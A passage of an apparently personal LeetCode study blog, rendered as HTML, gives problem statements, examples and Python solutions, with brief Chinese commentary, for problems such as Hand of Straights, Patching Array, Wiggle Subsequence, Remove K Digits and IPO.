class="keyword">else</span>:</span><br><span class="line">                    ret.append(l2.pop(<span class="number">0</span>))</span><br><span class="line">            <span class="keyword">return</span> ret</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">monostack</span>(<span class="params">lst, length</span>):</span><br><span class="line">            ret = []</span><br><span class="line">            preserve = <span class="built_in">len</span>(lst) - length</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(lst)):</span><br><span class="line">                <span class="keyword">while</span> preserve <span class="keyword">and</span> ret <span class="keyword">and</span> lst[i] &gt; ret[-<span class="number">1</span>]:</span><br><span class="line">                    ret.pop()</span><br><span class="line">                    preserve -= <span class="number">1</span></span><br><span class="line">                ret.append(lst[i])</span><br><span class="line">            <span class="keyword">return</span> ret[:length]</span><br><span class="line">        </span><br><span class="line">        n1 = <span class="built_in">len</span>(nums1)</span><br><span class="line">        n2 = <span class="built_in">len</span>(nums2)</span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(k+<span class="number">1</span>):</span><br><span class="line">            j = k-i</span><br><span class="line">            <span class="keyword">if</span> i &lt;= n1 <span class="keyword">and</span> j &lt;= n2:</span><br><span class="line">                lst1 = monostack(nums1, i)</span><br><span class="line">                lst2 = monostack(nums2, j)</span><br><span class="line">                res = <span class="built_in">max</span>(res, merge(lst1, lst2))</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h1 id="hand-of-straights">846. Hand of Straights</h1><p>Alice has some number of cards and she wants to rearrange the cards into groups so that each group is of size <code>groupSize</code>, and consists of <code>groupSize</code> consecutive cards.</p><p>Given an integer array <code>hand</code> where <code>hand[i]</code> is the value written on the <code>ith</code> card and an integer <code>groupSize</code>, return <code>true</code> if she can rearrange the cards, or <code>false</code> otherwise.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Example 1:</span><br><span class="line">    Input: hand = [1,2,3,6,2,3,4,7,8], groupSize = 3</span><br><span class="line">    Output: true</span><br><span class="line">    Explanation: Alice&#x27;s hand can be rearranged as [1,2,3],[2,3,4],[6,7,8]</span><br><span class="line"></span><br><span class="line">Example 2:</span><br><span class="line">    Input: hand = [1,2,3,4,5], groupSize = 4</span><br><span class="line">    Output: false</span><br><span class="line">    Explanation: Alice&#x27;s hand can not be rearranged into groups of 4.</span><br></pre></td></tr></table></figure><p>直观解法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isNStraightHand</span>(<span class="params">self, hand: <span class="type">List</span>[<span class="built_in">int</span>], groupSize: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(hand) % groupSize:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        hand = <span class="built_in">sorted</span>(hand)</span><br><span class="line">        lst = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> hand:</span><br><span class="line">            <span class="keyword">if</span> lst <span class="keyword">and</span> lst[-<span class="number">1</span>][<span class="number">0</span>] == i:</span><br><span class="line">                lst[-<span class="number">1</span>][<span class="number">1</span>] += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                lst.append([i, <span class="number">1</span>])</span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(lst)&gt;=groupSize:</span><br><span class="line">            k, v = lst.pop(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">if</span> v &gt; <span class="number">0</span>:</span><br><span class="line">                prev = k</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(groupSize-<span class="number">1</span>):</span><br><span class="line">                    <span class="keyword">if</span> lst[j][<span class="number">0</span>] != prev + <span class="number">1</span>:</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                    prev = prev+<span class="number">1</span></span><br><span class="line">                    lst[j][<span class="number">1</span>] -= v</span><br><span class="line">                    <span class="keyword">if</span> lst[j][<span class="number">1</span>] &lt; <span class="number">0</span>:</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> lst:</span><br><span class="line">            k, v = lst.pop(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">if</span> v &gt; <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><p>优化的版本, 用双向列表, 手牌先排序, 然后尽可能得叠顺子, 如果最小数都不能连接下一张牌就说明不满足.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isNStraightHand</span>(<span class="params">self, hand: <span class="type">List</span>[<span class="built_in">int</span>], groupSize: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        hand.sort()</span><br><span class="line">        lst = []</span><br><span class="line">        <span class="keyword">for</span> card <span class="keyword">in</span> hand:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> lst:</span><br><span class="line">                item = [<span class="number">1</span>, card]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> card == lst[<span class="number">0</span>][<span class="number">1</span>] + <span class="number">1</span>:</span><br><span class="line">                    item = lst.pop(<span class="number">0</span>)</span><br><span class="line">                    item[<span class="number">0</span>] += <span class="number">1</span></span><br><span class="line">                    item[<span class="number">1</span>] = card</span><br><span class="line">                <span class="keyword">elif</span> card == lst[<span class="number">0</span>][<span class="number">1</span>]:</span><br><span class="line">                    item = [<span class="number">1</span>, card]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> item[<span class="number">0</span>] &lt; groupSize:</span><br><span class="line">                lst.append(item)</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(lst) == <span class="number">0</span></span><br></pre></td></tr></table></figure><h1 id="patching-array">330. Patching Array</h1><p>Given a sorted integer array <code>nums</code> and an integer <code>n</code>, add/patch elements to the array such that any number in the range <code>[1, n]</code> inclusive can be formed by the sum of some elements in the array.</p><p>Return the minimum number of patches required.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Example 1:</span><br><span class="line">    Input: nums = [1,3], n = 6</span><br><span class="line">    Output: 1</span><br><span class="line">    Explanation:</span><br><span class="line">    Combinations of nums are [1], [3], [1,3], which form possible sums of: 1, 3, 4.</span><br><span class="line">    Now if we add/patch 2 to nums, the combinations are: [1], [2], [3], [1,3], [2,3], [1,2,3].</span><br><span class="line">    Possible sums are 1, 2, 3, 4, 5, 6, which now covers the range [1, 6].</span><br><span class="line">    So we only need 1 patch.</span><br><span class="line"></span><br><span class="line">Example 2:</span><br><span class="line">    Input: nums = [1,5,10], n = 20</span><br><span class="line">    Output: 2</span><br><span class="line">    Explanation: The two patches can be [2, 4].</span><br><span class="line"></span><br><span class="line">Example 3:</span><br><span class="line">    Input: nums = [1,2,2], n = 5</span><br><span class="line">    Output: 0</span><br></pre></td></tr></table></figure><p>有点复杂, 没写出来, 感觉是纯数学.</p><p>对于我们可以得到的[0, x], 假设我们得不到x+1, 那么我们就把x+1加进来, 这样我们就可以获取[0, 2x+1]的所有值, 即case2</p><p>对于所有的nums里面的值, 如果 x &lt; nums[i] &lt; 2x + 1, 在我们获取到 [x, 2x+1]之后, nums[i]也可以加进来, 从而我们可以获得[0, 2x+1 + nums[i]]. 即case1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">minPatches</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        bound = <span class="number">0</span></span><br><span class="line">        ans = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> bound &lt; n:</span><br><span class="line">            <span class="keyword">if</span> i &lt; <span class="built_in">len</span>(nums) <span class="keyword">and</span> nums[i] &lt;= bound + <span class="number">1</span>:</span><br><span class="line">                bound += nums[i]</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ans += <span class="number">1</span></span><br><span class="line">                bound += bound + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure><h1 id="increasing-triplet-subsequence">334. Increasing Triplet Subsequence</h1><p>Given an integer array nums, return true if there exists a triple of indices <code>(i, j, k)</code> such that <code>i &lt; j &lt; k</code> and <code>nums[i] &lt; nums[j] &lt; nums[k]</code>. If no such indices exists, return false.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Example 1:</span><br><span class="line">    Input: nums = [1,2,3,4,5]</span><br><span class="line">    Output: true</span><br><span class="line">    Explanation: Any triplet where i &lt; j &lt; k is valid.</span><br><span class="line"></span><br><span class="line">Example 2:</span><br><span class="line">    Input: nums = [5,4,3,2,1]</span><br><span class="line">    Output: false</span><br><span class="line">    Explanation: No triplet exists.</span><br><span class="line"></span><br><span class="line">Example 3:</span><br><span class="line">    Input: nums = [2,1,5,0,4,6]</span><br><span class="line">    Output: true</span><br><span class="line">    Explanation: The triplet (3, 4, 5) is valid because nums[3] == 0 &lt; nums[4] == 4 &lt; nums[5] = 6.</span><br></pre></td></tr></table></figure><p>最长递增子串, 做过一次</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">increasingTriplet</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        stack = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> nums:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> stack:</span><br><span class="line">                stack.append(i)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> i &gt; stack[-<span class="number">1</span>]:</span><br><span class="line">                    stack.append(i)</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">len</span>(stack) == <span class="number">3</span>:</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    stack[bisect.bisect_left(stack, i)] = i</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(stack) &gt;= <span class="number">3</span></span><br></pre></td></tr></table></figure><p>存在优化, 因为只需要三个元素, 逻辑并不需要二分, 直接判断即可.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">increasingTriplet</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        first = second = math.inf</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> nums:</span><br><span class="line">            <span class="keyword">if</span> i &lt;= first:</span><br><span class="line">                first = i</span><br><span class="line">            <span class="keyword">elif</span> i &lt;= second:</span><br><span class="line">                second = i</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><h1 id="wiggle-subsequence">376. Wiggle Subsequence</h1><p>A <strong>wiggle sequence</strong> is a sequence where the differences between successive numbers strictly alternate between positive and negative. The first difference (if one exists) may be either positive or negative. A sequence with one element and a sequence with two non-equal elements are trivially wiggle sequences.</p><p>For example, <code>[1, 7, 4, 9, 2, 5]</code> is a wiggle sequence because the differences <code>(6, -3, 5, -7, 3)</code> alternate between positive and negative. In contrast, <code>[1, 4, 7, 2, 5]</code> and <code>[1, 7, 4, 5, 5]</code> are not wiggle sequences. The first is not because its first two differences are positive, and the second is not because its last difference is zero. A subsequence is obtained by deleting some elements (possibly zero) from the original sequence, leaving the remaining elements in their original order.</p><p>Given an integer array <code>nums</code>, return the length of the longest <strong>wiggle subsequence</strong> of <code>nums</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Example 1:</span><br><span class="line">    Input: nums = [1,7,4,9,2,5]</span><br><span class="line">    Output: 6</span><br><span class="line">    Explanation: The entire sequence is a wiggle sequence with differences (6, -3, 5, -7, 3).</span><br><span class="line"></span><br><span class="line">Example 2:</span><br><span class="line">    Input: nums = [1,17,5,10,13,15,10,5,16,8]</span><br><span class="line">    Output: 7</span><br><span class="line">    Explanation: There are several subsequences that achieve this length.</span><br><span class="line">    One is [1, 17, 10, 13, 10, 16, 8] with differences (16, -7, 3, -3, 6, -8).</span><br><span class="line"></span><br><span class="line">Example 3:</span><br><span class="line">    Input: nums = [1,2,3,4,5,6,7,8,9]</span><br><span class="line">    Output: 2</span><br></pre></td></tr></table></figure><p>stack思路</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wiggleMaxLength</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        stack = []</span><br><span class="line">        state = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> nums:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> stack:</span><br><span class="line">                stack.append(i)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> i == stack[-<span class="number">1</span>]:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">elif</span> (state <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> state <span class="keyword">is</span> <span class="literal">True</span>) <span class="keyword">and</span> i &lt; stack[-<span class="number">1</span>]:</span><br><span class="line">                    stack.append(i)</span><br><span class="line">                    state = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">elif</span> (state <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> state <span class="keyword">is</span> <span class="literal">False</span>) <span class="keyword">and</span> i &gt; stack[-<span class="number">1</span>]:</span><br><span class="line">                    stack.append(i)</span><br><span class="line">                    state = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    stack.pop()</span><br><span class="line">                    stack.append(i)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(stack)</span><br></pre></td></tr></table></figure><p>实际中间变量可以无视, 贪心思路</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wiggleMaxLength</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        n = <span class="built_in">len</span>(nums)</span><br><span class="line">        <span class="keyword">if</span> n &lt; <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        </span><br><span class="line">        ans = <span class="number">1</span></span><br><span class="line">        prev = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n):</span><br><span class="line">            diff = nums[i] - nums[i-<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> (diff &gt; <span class="number">0</span> <span class="keyword">and</span> prev != <span class="number">1</span>) <span class="keyword">or</span> (diff &lt; <span class="number">0</span> <span class="keyword">and</span> prev != -<span class="number">1</span>):</span><br><span class="line">                ans += <span class="number">1</span></span><br><span class="line">                prev = <span class="number">1</span> <span class="keyword">if</span> diff &gt; <span class="number">0</span> <span class="keyword">else</span> -<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure><h1 id="integer-replacement">397. Integer Replacement</h1><p>Given a positive integer n, you can apply one of the following operations:</p><ol type="1"><li>If n is even, replace n with <code>n / 2</code>.<br /></li><li>If n is odd, replace n with either <code>n + 1</code> or <code>n - 1</code>.</li></ol><p>Return the minimum number of operations needed for n to become 1.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Example 1:</span><br><span class="line">    Input: n = 8</span><br><span class="line">    Output: 3</span><br><span class="line">    Explanation: 8 -&gt; 4 -&gt; 2 -&gt; 1</span><br><span class="line"></span><br><span class="line">Example 2:</span><br><span class="line">    Input: n = 7</span><br><span class="line">    Output: 4</span><br><span class="line">    Explanation: 7 -&gt; 8 -&gt; 4 -&gt; 2 -&gt; 1</span><br><span class="line">    or 7 -&gt; 6 -&gt; 3 -&gt; 2 -&gt; 1</span><br><span class="line"></span><br><span class="line">Example 3:</span><br><span class="line">    Input: n = 4</span><br><span class="line">    Output: 2</span><br></pre></td></tr></table></figure><p>看二进制末两位, 最后俩二进制位为11且数字大于3我们选择加, 其他时候选择减</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">integerReplacement</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        ans = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> n != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> n &amp; <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> n &amp; <span class="number">2</span> <span class="keyword">and</span> n &gt; <span class="number">3</span>:</span><br><span class="line">                    n += <span class="number">1</span></span><br><span class="line">                    n &gt;&gt;= <span class="number">2</span></span><br><span class="line">                    ans += <span class="number">3</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    n -= <span class="number">1</span></span><br><span class="line">                    n &gt;&gt;= <span class="number">1</span></span><br><span class="line">                    ans += <span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                n &gt;&gt;= <span class="number">1</span></span><br><span class="line">                ans += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure><h1 id="remove-k-digits">402. Remove K Digits</h1><p>Given string num representing a non-negative integer <code>num</code>, and an integer <code>k</code>, return the smallest possible integer after removing <code>k</code> digits from <code>num</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Example 1:</span><br><span class="line">    Input: num = &quot;1432219&quot;, k = 3</span><br><span class="line">    Output: &quot;1219&quot;</span><br><span class="line">    Explanation: Remove the three digits 4, 3, and 2 to form the new number 1219 which is the smallest.</span><br><span class="line"></span><br><span class="line">Example 2:</span><br><span class="line">    Input: num = &quot;10200&quot;, k = 1</span><br><span class="line">    Output: &quot;200&quot;</span><br><span class="line">    Explanation: Remove the leading 1 and the number is 200. Note that the output must not contain leading zeroes.</span><br><span class="line"></span><br><span class="line">Example 3:</span><br><span class="line">    Input: num = &quot;10&quot;, k = 2</span><br><span class="line">    Output: &quot;0&quot;</span><br><span class="line">    Explanation: Remove all the digits from the number and it is left with nothing which is 0.</span><br></pre></td></tr></table></figure><p>monostack, stack存数值, 一旦检测更小值就pop然后k-=1, 直到符合要求.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">removeKdigits</span>(<span class="params">self, num: <span class="built_in">str</span>, k: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        n = <span class="built_in">len</span>(num)</span><br><span class="line">        <span class="keyword">if</span> num.count(<span class="string">&#x27;0&#x27;</span>) &gt;= n-k:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        stack = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> num:</span><br><span class="line">            <span class="keyword">while</span> k <span class="keyword">and</span> stack <span class="keyword">and</span> stack[-<span class="number">1</span>] &gt; i:</span><br><span class="line">                stack.pop()</span><br><span class="line">                k -= <span class="number">1</span></span><br><span class="line">            stack.append(i)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(stack[:-k <span class="keyword">or</span> <span class="literal">None</span>]).lstrip(<span class="string">&#x27;0&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="ipo">502. IPO</h1><p>描述复杂, 简单说就是给出两个list: profits和capital. 分别对应一个项目列表的纯利润和最低启动资金</p><p>需要求解在拥有w的启动资金且最多做k个项目的情况下的最大利润</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Example 1:</span><br><span class="line">    Input: k = 2, w = 0, profits = [1,2,3], capital = [0,1,1]</span><br><span class="line">    Output: 4</span><br><span class="line">    Explanation: Since your initial capital is 0, you can only start the project indexed 0.</span><br><span class="line">    After finishing it you will obtain profit 1 and your capital becomes 1.</span><br><span class="line">    With capital 1, you can either start the project indexed 1 or the project indexed 2.</span><br><span class="line">    Since you can choose at most 2 projects, you need to finish the project indexed 2 to get the maximum capital.</span><br><span class="line">    Therefore, output the final maximized capital, which is 0 + 1 + 3 = 4.</span><br><span class="line"></span><br><span class="line">Example 2:</span><br><span class="line">    Input: k = 3, w = 0, profits = [1,2,3], capital = [0,1,2]</span><br><span class="line">    Output: 6</span><br></pre></td></tr></table></figure><p>一开始的做法有点暴力, 但也能AC</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">findMaximizedCapital</span>(<span class="params">self, k: <span class="built_in">int</span>, w: <span class="built_in">int</span>, profits: <span class="type">List</span>[<span class="built_in">int</span>], capital: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        d = defaultdict(<span class="built_in">list</span>)</span><br><span class="line">        <span class="keyword">for</span> k_, v_ <span class="keyword">in</span> <span class="built_in">sorted</span>(<span class="built_in">zip</span>(profits, capital), key=<span class="keyword">lambda</span> x: (-x[<span class="number">0</span>], x[<span class="number">1</span>])):</span><br><span class="line">            d[k_].append(v_)</span><br><span class="line"></span><br><span class="line">        curr_capital = w</span><br><span class="line">        chosen_k = <span class="literal">None</span></span><br><span class="line">        chosen_v = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">while</span> k:</span><br><span class="line">            <span class="keyword">for</span> k_, v_ <span class="keyword">in</span> d.items():</span><br><span class="line">                <span class="keyword">if</span> v_[<span 